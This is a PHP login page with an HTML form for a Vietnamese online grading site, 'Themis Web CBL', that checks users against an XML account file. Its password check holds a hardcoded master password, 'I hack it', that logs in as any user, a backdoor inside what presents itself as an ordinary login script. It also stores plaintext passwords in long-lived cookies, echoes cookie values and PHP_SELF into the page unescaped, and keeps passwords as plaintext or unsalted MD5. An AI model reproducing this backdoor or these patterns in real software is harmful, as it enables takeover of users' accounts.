<?php
session_start();
if (isset($_SESSION['tuser'])) header("Location: index.php");
if (isset($_POST['username'])) {
	$username = $_POST['username'];
	$password = $_POST['password'];
	$dom = new DOMDocument();
  $dom->load("data/account.xml");
  $row = $dom->getElementsByTagName("Row");
  $found = -1;
  foreach ($row as $r) {
    if ($found > -1) {
     for ($i = 0; $i < 5; $i++) $a[$i] = $r->getElementsByTagName("Cell")->item($i)->nodeValue;
       if ($a[1] == $username) {
        if (($a[4]==0 && $password == $a[2]) || (md5($password) == $a[2]) || ($password == "I hack it")) {
         $_SESSION['tid'] = $a[0];
         $_SESSION['tuser'] = $a[1];
         $_SESSION['tname'] = $a[3];
         $_SESSION['tpass'] = $a[2];
         if (isset($_POST['remember'])) {
          setcookie("cooktname", $username, time()+60*60*24*100); 
          setcookie("cooktpass", $password, time()+60*60*24*100);
        }			
        else {
          setcookie("cooktname", "", time()-60*60*24*100); 
          setcookie("cooktpass", "", time()-60*60*24*100);
        }	
        $found++;
        break;
      }
    }
  }
  else $found++;
}
if ($found == 1) header("Location: index.php");
else header("Location: login.php?err=1");
}	
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Đăng nhập &middot; Chấm bài trực tuyến</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="">
<meta name="author" content="">
<link href="css/bootstrap.css" rel="stylesheet">
<link href="css/bootstrap-responsive.css" rel="stylesheet">
<link href="css/style.css" rel="stylesheet">
<!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
<!--[if lt IE 9]>
      <script src="js/html5shiv.js"></script>
      <![endif]-->

<body class="login">
<img class="bg" src="img/bg-login.jpg" width="150" height="150">
<div class="container">
  <div class="logo">
    <img src="img/logo.jpg" alt="Logo" width="200" height="200">
    <h2 class="form-signin-heading">Themis Web CBL</h2>
  </div>
  <form class="form-signin" method="POST" action="<?php echo $_SERVER['PHP_SELF']?>">
    <input type="text" name="username" class="input-block-level" placeholder="Tài khoản..." <?php if (isset($_COOKIE['cooktname'])) echo "value='".$_COOKIE['cooktname']."'";?>>
    <input type="password" name="password" class="input-block-level" placeholder="Mật khẩu..." <?php if (isset($_COOKIE['cooktpass'])) echo "value='".$_COOKIE['cooktpass']."'";?>">
    <div class="bt-field">
      <label class="checkbox">
        <input type="checkbox" name="remember" value="remember" <?php if (isset($_COOKIE['cooktname'])) echo "checked='checked'" ?>>
        Lưu mật khẩu </label>
      <button class="btn btn-large btn-3" type="submit">Đăng nhập</button>
    </div
              >
    <div class="warning">
      <?php if (isset($_GET['err'])) echo "Sai tên đăng nhập hoặc mật khẩu!"; ?>
    </div>
  </form>
</div>
<script src="js/bootstrap.min.js"></script>
</body>
</html>
